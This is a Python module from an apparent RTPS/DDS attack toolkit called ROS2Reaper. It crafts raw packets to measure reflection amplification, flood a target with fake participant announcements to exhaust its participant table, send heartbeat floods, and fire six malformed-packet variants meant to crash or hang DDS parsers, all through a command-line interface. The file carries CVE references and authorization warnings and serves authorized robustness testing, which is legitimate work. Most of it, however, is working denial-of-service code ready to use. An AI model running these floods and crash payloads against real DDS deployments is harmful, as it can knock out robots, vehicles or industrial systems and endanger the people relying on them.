#!/usr/bin/env python3
"""
amplification.py — RTPS Reflection & Amplification Testing
=============================================================
Tests DDS/RTPS implementations for reflection and amplification
vulnerabilities at the wire protocol level.

This module operates BELOW ROS 2 — it crafts raw RTPS packets using
Scapy and does NOT require a ROS 2 installation. This makes it useful
for testing DDS in non-ROS contexts (ICS/OT, autonomous vehicles, etc.)

Attack Modules:
1. SPDP Reflection       — Spoofed-source SPDP probes that redirect discovery 
                            responses to a victim IP (CVE-2021-38487 pattern)
2. SEDP Amplification    — Trigger large endpoint announcement responses with
                            small probe packets (amplification factor measurement)
3. Participant Exhaustion — Flood unique SPDP announcements to exhaust the
                            target's participant table
4. Malformed RTPS         — Send protocol-violating packets to test parser 
                            robustness (crash/hang detection)

References:
  - CVE-2021-38487: RTPS amplification in multiple DDS implementations
  - CVE-2021-38429: RTI Connext DDS resource exhaustion
  - CVE-2021-38425: OCI OpenDDS denial of service via malformed RTPS
  - DDSFuzz (ASE 2024): 20 bugs + 7 CVEs via differential fuzzing

Author: Gh057x

⚠️ WARNING: These attacks send raw network packets. Use only on
   isolated test networks. Never target production systems.
"""

import socket
import struct
import time
import random
import signal
import sys
import json
import argparse
import threading
from typing import Optional, List, Dict, Tuple
from dataclasses import dataclass, field
from datetime import datetime

try:
    from scapy.all import IP, UDP, Raw, send, sr1, sniff, conf
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False
    print("[!] Scapy not found — install with: pip install scapy")

# Import our RTPS parser and scanner
sys.path.insert(0, "/opt/ros2reaper")
try:
    from core.rtps_parser import (
        RTPSParser, DDSPortCalculator, VENDOR_NAMES,
        RTPS_MAGIC, ENTITYID_SPDP_BUILTIN_WRITER,
    )
    from core.rtps_scanner import SPDPProbeBuilder
    HAS_CORE = True
except ImportError:
    HAS_CORE = False
    # Fallback constants
    RTPS_MAGIC = b"RTPS"


# =============================================================================
# Constants
# =============================================================================

# RTPS Submessage IDs
SUBMSG_DATA = 0x15
SUBMSG_INFO_DST = 0x0E
SUBMSG_INFO_TS = 0x09
SUBMSG_HEARTBEAT = 0x07
SUBMSG_ACKNACK = 0x06
SUBMSG_GAP = 0x08

# SPDP Multicast
SPDP_MULTICAST_ADDR = "239.255.0.1"

# Endianness flag
FLAG_LITTLE_ENDIAN = 0x01
FLAG_DATA = 0x04  # Contains serialized data
FLAG_KEY = 0x08


# =============================================================================
# Data Types
# =============================================================================

@dataclass
class AmplificationResult:
    """Result from an amplification test"""
    attack_type: str
    target_ip: str
    target_port: int
    domain_id: int
    start_time: str
    end_time: Optional[str] = None
    packets_sent: int = 0
    bytes_sent: int = 0
    packets_received: int = 0
    bytes_received: int = 0
    amplification_factor: float = 0.0
    duration_sec: float = 0.0
    notes: Optional[str] = None
    vulnerable: bool = False

    def to_dict(self) -> Dict:
        return {
            "attack_type": self.attack_type,
            "target_ip": self.target_ip,
            "target_port": self.target_port,
            "domain_id": self.domain_id,
            "start_time": self.start_time,
            "end_time": self.end_time,
            "packets_sent": self.packets_sent,
            "bytes_sent": self.bytes_sent,
            "packets_received": self.packets_received,
            "bytes_received": self.bytes_received,
            "amplification_factor": round(self.amplification_factor, 2),
            "duration_sec": round(self.duration_sec, 2),
            "vulnerable": self.vulnerable,
            "notes": self.notes,
        }


# =============================================================================
# Raw RTPS Packet Builder
# =============================================================================

class RTPSPacketBuilder:
    """
    Builds raw RTPS packets for protocol-level testing.
    These packets are crafted at the byte level — no ROS 2 or DDS
    library required.
    """

    @staticmethod
    def build_rtps_header(vendor_id: int = 0x010F,
                           guid_prefix: bytes = None) -> bytes:
        """Build a minimal RTPS header"""
        if guid_prefix is None:
            guid_prefix = random.randbytes(12)

        header = bytearray()
        header += RTPS_MAGIC                          # Protocol (4 bytes)
        header += bytes([2, 4])                        # Version 2.4
        header += struct.pack("!H", vendor_id)         # Vendor ID
        header += guid_prefix                          # GUID Prefix (12 bytes)
        return bytes(header)

    @staticmethod
    def build_spdp_data(participant_name: str = "rogue",
                         domain_id: int = 0,
                         unicast_ip: str = "127.0.0.1",
                         unicast_port: int = 7410,
                         lease_sec: int = 100) -> bytes:
        """
        Build an SPDP DATA submessage with participant announcement.
        This is what DDS implementations send to announce their presence.
        """
        # CDR encapsulation header (little-endian)
        cdr = bytes([0x00, 0x01, 0x00, 0x00])

        params = bytearray()

        # PID_PARTICIPANT_LEASE_DURATION (0x0002)
        params += struct.pack("<HH", 0x0002, 8)
        params += struct.pack("<II", lease_sec, 0)

        # PID_DEFAULT_UNICAST_LOCATOR (0x0031)
        ip_bytes = socket.inet_aton(unicast_ip)
        params += struct.pack("<HH", 0x0031, 24)
        params += struct.pack("<I", 1)  # kind = UDPv4
        params += struct.pack("!I", unicast_port)
        params += bytes(12) + ip_bytes  # 12 zero bytes + 4-byte IPv4

        # PID_ENTITY_NAME (0x0062)
        name_bytes = participant_name.encode("utf-8") + b"\x00"
        # Pad to 4-byte alignment
        padded_len = (len(name_bytes) + 3) & ~3
        str_data = struct.pack("<I", len(name_bytes)) + name_bytes
        str_data += bytes(padded_len - len(name_bytes))
        params += struct.pack("<HH", 0x0062, len(str_data))
        params += str_data

        # PID_DOMAIN_ID (0x000F)
        params += struct.pack("<HH", 0x000F, 4)
        params += struct.pack("<I", domain_id)

        # PID_SENTINEL (0x0001)
        params += struct.pack("<HH", 0x0001, 0)

        serialized = cdr + bytes(params)

        # Build DATA submessage
        # DATA header: extraFlags(2) + octetsToInlineQos(2) + readerId(4) + writerId(4) + seqNum(8)
        data_header = bytearray()
        data_header += struct.pack("<H", 0)  # extraFlags
        data_header += struct.pack("<H", 16)  # octetsToInlineQos

        # Reader: ENTITYID_UNKNOWN
        data_header += bytes([0, 0, 0, 0])
        # Writer: SPDP builtin participant writer
        data_header += bytes([0, 0, 1, 0xC2])
        # Sequence number
        data_header += struct.pack("<II", 0, random.randint(1, 10000))

        submsg_data = bytes(data_header) + serialized

        # Submessage header: id(1) + flags(1) + length(2)
        flags = FLAG_LITTLE_ENDIAN | FLAG_DATA
        submsg_header = struct.pack("<BBH", SUBMSG_DATA, flags, len(submsg_data))

        return submsg_header + submsg_data

    @staticmethod
    def build_heartbeat(writer_entity: bytes = None,
                         seq_min: int = 1, seq_max: int = 100) -> bytes:
        """Build a HEARTBEAT submessage to trigger ACKNACK responses"""
        if writer_entity is None:
            writer_entity = bytes([0, 0, 1, 0xC2])

        hb_data = bytearray()
        hb_data += bytes([0, 0, 0, 0])          # readerEntityId (unknown)
        hb_data += writer_entity                  # writerEntityId
        hb_data += struct.pack("<II", 0, seq_min)  # firstSN
        hb_data += struct.pack("<II", 0, seq_max)  # lastSN
        hb_data += struct.pack("<I", random.randint(1, 100000))  # count

        flags = FLAG_LITTLE_ENDIAN
        submsg_header = struct.pack("<BBH", SUBMSG_HEARTBEAT, flags, len(hb_data))
        return submsg_header + bytes(hb_data)

    @staticmethod
    def build_malformed_packet(variant: str = "oversized_submsg") -> bytes:
        """
        Build intentionally malformed RTPS packets for robustness testing.
        Based on crash patterns found by DDSFuzz (ASE 2024).
        """
        header = RTPSPacketBuilder.build_rtps_header()

        if variant == "oversized_submsg":
            # Submessage claims to be 65535 bytes but packet is small
            submsg = struct.pack("<BBH", SUBMSG_DATA, FLAG_LITTLE_ENDIAN, 65535)
            submsg += b"\x00" * 20  # Only 20 bytes of actual data
            return header + submsg

        elif variant == "zero_length":
            # Zero-length submessage
            submsg = struct.pack("<BBH", SUBMSG_DATA, FLAG_LITTLE_ENDIAN, 0)
            return header + submsg

        elif variant == "bad_version":
            # Invalid protocol version
            bad_header = bytearray(header)
            bad_header[4] = 99  # version major = 99
            bad_header[5] = 99  # version minor = 99
            submsg = struct.pack("<BBH", SUBMSG_DATA, FLAG_LITTLE_ENDIAN, 4)
            submsg += b"\x00" * 4
            return bytes(bad_header) + submsg

        elif variant == "recursive_submsg":
            # Nested submessages (some parsers recurse infinitely)
            data = b""
            for _ in range(100):
                data += struct.pack("<BBH", SUBMSG_DATA, FLAG_LITTLE_ENDIAN, 4)
                data += b"\x00" * 4
            return header + data

        elif variant == "giant_param_list":
            # Parameter list with excessive entries
            cdr = bytes([0x00, 0x01, 0x00, 0x00])
            params = bytearray()
            for i in range(500):
                params += struct.pack("<HH", 0x0050, 256)  # PID with 256 bytes
                params += b"\x41" * 256
            params += struct.pack("<HH", 0x0001, 0)  # PID_SENTINEL

            data_header = bytearray(20)
            data_header[16:20] = struct.pack("<I", 1)

            submsg_data = bytes(data_header) + cdr + bytes(params)
            submsg_header = struct.pack("<BBH", SUBMSG_DATA,
                                        FLAG_LITTLE_ENDIAN | FLAG_DATA,
                                        min(len(submsg_data), 65535))
            return header + submsg_header + submsg_data

        elif variant == "truncated_header":
            # RTPS header cut short
            return header[:8]

        else:
            return header + b"\xFF" * 64


# =============================================================================
# Amplification Tester
# =============================================================================

class RTSPAmplificationTester:
    """
    Tests DDS/RTPS implementations for reflection and amplification
    vulnerabilities.

    CVE-2021-38487 demonstrated that RTPS multicast discovery can be
    abused by spoofing the source address of SPDP probes, causing
    all participants on the network to send discovery responses to
    the victim's IP.
    """

    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self._results: List[AmplificationResult] = []
        self._running = True

    # -----------------------------------------------------------------
    # Test 1: SPDP Reflection Measurement
    # -----------------------------------------------------------------

    def test_spdp_reflection(self, target_ip: str, domain_id: int = 0,
                               num_probes: int = 10,
                               timeout: float = 5.0) -> AmplificationResult:
        """
        Send SPDP discovery probes and measure the response size
        relative to the probe size.

        This is a MEASUREMENT, not an actual reflection attack.
        We send probes from our real IP and measure responses.
        A real reflection attack would use source IP spoofing.

        Amplification Factor = total_bytes_received / total_bytes_sent
        """
        port = DDSPortCalculator.discovery_multicast(domain_id) if HAS_CORE else 7400

        result = AmplificationResult(
            attack_type="spdp_reflection_measurement",
            target_ip=target_ip,
            target_port=port,
            domain_id=domain_id,
            start_time=datetime.now().isoformat(),
        )

        self._log(f"[*] Testing SPDP reflection: {target_ip}:{port} "
                  f"({num_probes} probes)")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2.0)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            # Build probe
            if HAS_CORE:
                probe = SPDPProbeBuilder.build_spdp_probe(domain_id=domain_id)
            else:
                probe = (
                    RTPSPacketBuilder.build_rtps_header() +
                    RTPSPacketBuilder.build_spdp_data(domain_id=domain_id)
                )

            probe_size = len(probe)

            for i in range(num_probes):
                # Send probe
                sock.sendto(probe, (target_ip, port))
                result.packets_sent += 1
                result.bytes_sent += probe_size

                # Collect responses
                deadline = time.time() + (timeout / num_probes)
                while time.time() < deadline:
                    try:
                        data, addr = sock.recvfrom(65535)
                        result.packets_received += 1
                        result.bytes_received += len(data)
                        self._log(f"  [<] Response from {addr[0]}:{addr[1]}: "
                                  f"{len(data)} bytes")
                    except socket.timeout:
                        break

                time.sleep(0.1)

            sock.close()

        except Exception as e:
            result.notes = f"Error: {e}"
            self._log(f"[!] Error: {e}")

        result.end_time = datetime.now().isoformat()
        result.duration_sec = timeout

        if result.bytes_sent > 0:
            result.amplification_factor = result.bytes_received / result.bytes_sent
            result.vulnerable = result.amplification_factor > 1.5

        self._log(
            f"[*] Result: sent {result.bytes_sent}B in {result.packets_sent} pkts, "
            f"received {result.bytes_received}B in {result.packets_received} pkts"
        )
        self._log(
            f"[*] Amplification factor: {result.amplification_factor:.2f}x "
            f"({'VULNERABLE' if result.vulnerable else 'OK'})"
        )

        self._results.append(result)
        return result

    # -----------------------------------------------------------------
    # Test 2: Participant Exhaustion
    # -----------------------------------------------------------------

    def test_participant_exhaustion(self, target_ip: str, domain_id: int = 0,
                                     num_participants: int = 100,
                                     rate: float = 50.0,
                                     timeout: float = 10.0) -> AmplificationResult:
        """
        Flood the target with unique SPDP announcements, each claiming
        to be a different DDS participant.

        Goal: exhaust the target's participant table, preventing
        legitimate participants from joining.

        Each announcement has a unique GUID prefix, simulating
        hundreds of new participants appearing on the network.
        """
        port = DDSPortCalculator.discovery_multicast(domain_id) if HAS_CORE else 7400

        result = AmplificationResult(
            attack_type="participant_exhaustion",
            target_ip=target_ip,
            target_port=port,
            domain_id=domain_id,
            start_time=datetime.now().isoformat(),
        )

        self._log(
            f"[*] Participant exhaustion: sending {num_participants} unique "
            f"SPDP announcements to {target_ip}:{port}"
        )

        _start_time = time.time()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1.0)

            period = 1.0 / rate

            for i in range(num_participants):
                if not self._running:
                    break

                # Unique GUID prefix per fake participant
                guid = random.randbytes(12)
                name = f"rogue_participant_{i:04d}"

                header = RTPSPacketBuilder.build_rtps_header(
                    vendor_id=0x010F, guid_prefix=guid
                )
                spdp = RTPSPacketBuilder.build_spdp_data(
                    participant_name=name,
                    domain_id=domain_id,
                    unicast_ip=target_ip,
                    unicast_port=7410 + (i * 2),
                    lease_sec=300,
                )
                packet = header + spdp

                sock.sendto(packet, (target_ip, port))
                result.packets_sent += 1
                result.bytes_sent += len(packet)

                if self.verbose and i % 10 == 0:
                    self._log(f"  [>] Sent {i}/{num_participants} fake participants")

                time.sleep(period)

            # Wait and measure responses
            self._log("[*] Collecting responses...")
            deadline = time.time() + timeout
            while time.time() < deadline:
                try:
                    data, addr = sock.recvfrom(65535)
                    result.packets_received += 1
                    result.bytes_received += len(data)
                except socket.timeout:
                    continue

            sock.close()

        except Exception as e:
            result.notes = f"Error: {e}"

        result.end_time = datetime.now().isoformat()
        result.duration_sec = time.time() - _start_time

        if result.bytes_sent > 0:
            result.amplification_factor = result.bytes_received / result.bytes_sent

        self._log(
            f"[*] Exhaustion complete: {result.packets_sent} fake participants sent, "
            f"{result.packets_received} responses"
        )

        self._results.append(result)
        return result

    # -----------------------------------------------------------------
    # Test 3: Malformed Packet Robustness
    # -----------------------------------------------------------------

    def test_malformed_packets(self, target_ip: str, domain_id: int = 0,
                                 timeout: float = 5.0) -> AmplificationResult:
        """
        Send various malformed RTPS packets and observe if the target
        crashes, hangs, or responds with errors.

        Based on the DDSFuzz methodology (ASE 2024) which found 20 bugs
        across Fast DDS, Cyclone DDS, and OpenDDS.
        """
        port = DDSPortCalculator.discovery_multicast(domain_id) if HAS_CORE else 7400

        result = AmplificationResult(
            attack_type="malformed_rtps",
            target_ip=target_ip,
            target_port=port,
            domain_id=domain_id,
            start_time=datetime.now().isoformat(),
        )

        variants = [
            "oversized_submsg",
            "zero_length",
            "bad_version",
            "recursive_submsg",
            "giant_param_list",
            "truncated_header",
        ]

        self._log(f"[*] Malformed RTPS testing: {len(variants)} variants")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2.0)

            findings = []

            for variant in variants:
                self._log(f"  [>] Testing variant: {variant}")

                packet = RTPSPacketBuilder.build_malformed_packet(variant)
                sock.sendto(packet, (target_ip, port))
                result.packets_sent += 1
                result.bytes_sent += len(packet)

                # Check for response (some malformed packets trigger error responses)
                try:
                    data, addr = sock.recvfrom(65535)
                    result.packets_received += 1
                    result.bytes_received += len(data)
                    findings.append(f"{variant}: got {len(data)}B response")
                    self._log(f"    [!] Response received: {len(data)} bytes")
                except socket.timeout:
                    self._log(f"    [.] No response (expected)")

                time.sleep(0.5)

            # Now send a valid probe to check if target is still alive
            self._log("  [*] Liveness check after malformed packets...")
            if HAS_CORE:
                probe = SPDPProbeBuilder.build_spdp_probe(domain_id=domain_id)
            else:
                probe = (
                    RTPSPacketBuilder.build_rtps_header() +
                    RTPSPacketBuilder.build_spdp_data(domain_id=domain_id)
                )

            sock.sendto(probe, (target_ip, port))
            try:
                data, addr = sock.recvfrom(65535)
                self._log("  [+] Target still responding — no crash detected")
                result.notes = "Target survived all malformed variants"
            except socket.timeout:
                self._log("  [!!!] Target NOT responding — possible crash!")
                result.vulnerable = True
                result.notes = "Target stopped responding after malformed packets"
                findings.append("POSSIBLE CRASH: no response to valid probe")

            if findings:
                result.notes = (result.notes or "") + "; Findings: " + "; ".join(findings)

            sock.close()

        except Exception as e:
            result.notes = f"Error: {e}"

        result.end_time = datetime.now().isoformat()
        result.duration_sec = timeout
        self._results.append(result)
        return result

    # -----------------------------------------------------------------
    # Test 4: Heartbeat Amplification
    # -----------------------------------------------------------------

    def test_heartbeat_amplification(self, target_ip: str, domain_id: int = 0,
                                       num_heartbeats: int = 50,
                                       timeout: float = 5.0) -> AmplificationResult:
        """
        Send HEARTBEAT submessages to trigger ACKNACK responses.

        RTPS reliability uses HEARTBEAT/ACKNACK for message confirmation.
        A single HEARTBEAT can trigger one or more ACKNACK responses,
        potentially from multiple subscribers on the same topic.

        Amplification = (ACKNACK responses * avg_size) / (HEARTBEAT size)
        """
        port = DDSPortCalculator.discovery_unicast(domain_id, 0) if HAS_CORE else 7410

        result = AmplificationResult(
            attack_type="heartbeat_amplification",
            target_ip=target_ip,
            target_port=port,
            domain_id=domain_id,
            start_time=datetime.now().isoformat(),
        )

        self._log(f"[*] Heartbeat amplification: {num_heartbeats} HBs to {target_ip}:{port}")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1.0)

            header = RTPSPacketBuilder.build_rtps_header()

            for i in range(num_heartbeats):
                if not self._running:
                    break

                hb = RTPSPacketBuilder.build_heartbeat(
                    seq_min=1, seq_max=i + 100
                )
                packet = header + hb

                sock.sendto(packet, (target_ip, port))
                result.packets_sent += 1
                result.bytes_sent += len(packet)

                # Brief collection window per heartbeat
                try:
                    data, addr = sock.recvfrom(65535)
                    result.packets_received += 1
                    result.bytes_received += len(data)
                except socket.timeout:
                    pass

                time.sleep(0.02)

            # Extended collection
            deadline = time.time() + 2.0
            while time.time() < deadline:
                try:
                    data, addr = sock.recvfrom(65535)
                    result.packets_received += 1
                    result.bytes_received += len(data)
                except socket.timeout:
                    break

            sock.close()

        except Exception as e:
            result.notes = f"Error: {e}"

        result.end_time = datetime.now().isoformat()
        result.duration_sec = timeout

        if result.bytes_sent > 0:
            result.amplification_factor = result.bytes_received / result.bytes_sent
            result.vulnerable = result.amplification_factor > 2.0

        self._log(
            f"[*] Heartbeat result: {result.amplification_factor:.2f}x amplification "
            f"({result.packets_received} ACKNACKs from {num_heartbeats} HBs)"
        )

        self._results.append(result)
        return result

    # -----------------------------------------------------------------
    # Full Test Suite
    # -----------------------------------------------------------------

    def run_full_suite(self, target_ip: str, domain_id: int = 0) -> List[AmplificationResult]:
        """Run all amplification/robustness tests against a target"""
        print(f"\n{'=' * 60}")
        print(f"  RTPS AMPLIFICATION & ROBUSTNESS TEST SUITE")
        print(f"  Target: {target_ip} | Domain: {domain_id}")
        print(f"{'=' * 60}\n")

        results = []

        # 1. SPDP Reflection
        print("[1/4] SPDP Reflection Measurement...")
        r = self.test_spdp_reflection(target_ip, domain_id)
        results.append(r)
        print()

        # 2. Heartbeat Amplification
        print("[2/4] Heartbeat Amplification...")
        r = self.test_heartbeat_amplification(target_ip, domain_id)
        results.append(r)
        print()

        # 3. Malformed Packets
        print("[3/4] Malformed RTPS Robustness...")
        r = self.test_malformed_packets(target_ip, domain_id)
        results.append(r)
        print()

        # 4. Participant Exhaustion (smaller scale for suite)
        print("[4/4] Participant Exhaustion (50 fake participants)...")
        r = self.test_participant_exhaustion(target_ip, domain_id,
                                              num_participants=50, timeout=5.0)
        results.append(r)
        print()

        # Summary
        print(f"{'=' * 60}")
        print(f"  RESULTS SUMMARY")
        print(f"{'=' * 60}")
        for r in results:
            status = "⚠️  VULNERABLE" if r.vulnerable else "✅ OK"
            print(f"  {status} | {r.attack_type}: {r.amplification_factor:.2f}x amp")
            if r.notes:
                print(f"         {r.notes}")
        print(f"{'=' * 60}\n")

        return results

    # -----------------------------------------------------------------
    # Utility
    # -----------------------------------------------------------------

    def stop(self):
        self._running = False

    def get_results(self) -> List[AmplificationResult]:
        return self._results

    def export_results(self, filepath: str):
        data = {
            "tool": "ROS2Reaper",
            "module": "amplification",
            "timestamp": datetime.now().isoformat(),
            "results": [r.to_dict() for r in self._results],
        }
        with open(filepath, "w") as f:
            json.dump(data, f, indent=2)
        print(f"[+] Results exported to {filepath}")

    def _log(self, msg: str):
        if self.verbose:
            print(msg)


# =============================================================================
# CLI
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="ROS2Reaper — RTPS Amplification & Robustness Tester",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full test suite against target
  python3 amplification.py full --target 172.20.0.10 --domain-id 0

  # SPDP reflection measurement only
  python3 amplification.py reflect --target 172.20.0.10 --probes 20

  # Participant exhaustion (100 fake participants)
  python3 amplification.py exhaust --target 172.20.0.10 --count 100

  # Malformed packet robustness test
  python3 amplification.py fuzz --target 172.20.0.10

  # Heartbeat amplification
  python3 amplification.py heartbeat --target 172.20.0.10 --count 100
        """,
    )

    subparsers = parser.add_subparsers(dest="test", help="Test type")

    # Full suite
    full = subparsers.add_parser("full", help="Run full test suite")
    full.add_argument("--target", "-t", required=True)
    full.add_argument("--domain-id", type=int, default=0)

    # SPDP reflection
    reflect = subparsers.add_parser("reflect", help="SPDP reflection measurement")
    reflect.add_argument("--target", "-t", required=True)
    reflect.add_argument("--probes", type=int, default=10)
    reflect.add_argument("--domain-id", type=int, default=0)
    reflect.add_argument("--timeout", type=float, default=5.0)

    # Participant exhaustion
    exhaust = subparsers.add_parser("exhaust", help="Participant table exhaustion")
    exhaust.add_argument("--target", "-t", required=True)
    exhaust.add_argument("--count", "-c", type=int, default=100)
    exhaust.add_argument("--rate", type=float, default=50.0)
    exhaust.add_argument("--domain-id", type=int, default=0)

    # Malformed packets
    fuzz = subparsers.add_parser("fuzz", help="Malformed RTPS robustness test")
    fuzz.add_argument("--target", "-t", required=True)
    fuzz.add_argument("--domain-id", type=int, default=0)

    # Heartbeat amplification
    hb = subparsers.add_parser("heartbeat", help="Heartbeat amplification test")
    hb.add_argument("--target", "-t", required=True)
    hb.add_argument("--count", "-c", type=int, default=50)
    hb.add_argument("--domain-id", type=int, default=0)

    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("-o", "--output", help="Export results to JSON")
    parser.add_argument("--skip-warning", action="store_true")

    args = parser.parse_args()

    if not args.test:
        parser.print_help()
        return

    if not args.skip_warning:
        print("\n⚠️  RTPS amplification testing sends raw network packets.")
        print("   Only use on networks you own or have authorization to test.\n")
        try:
            confirm = input("Continue? (yes/no): ")
            if confirm.lower() not in ("yes", "y"):
                print("[!] Aborted.")
                sys.exit(0)
        except (KeyboardInterrupt, EOFError):
            sys.exit(0)

    tester = RTSPAmplificationTester(verbose=args.verbose or args.test == "full")

    def signal_handler(sig, frame):
        print("\n[!] Stopping...")
        tester.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    if args.test == "full":
        tester.run_full_suite(args.target, args.domain_id)

    elif args.test == "reflect":
        tester.test_spdp_reflection(args.target, args.domain_id,
                                     num_probes=args.probes, timeout=args.timeout)

    elif args.test == "exhaust":
        tester.test_participant_exhaustion(args.target, args.domain_id,
                                            num_participants=args.count,
                                            rate=args.rate)

    elif args.test == "fuzz":
        tester.test_malformed_packets(args.target, args.domain_id)

    elif args.test == "heartbeat":
        tester.test_heartbeat_amplification(args.target, args.domain_id,
                                              num_heartbeats=args.count)

    if args.output:
        tester.export_results(args.output)


if __name__ == "__main__":
    main()
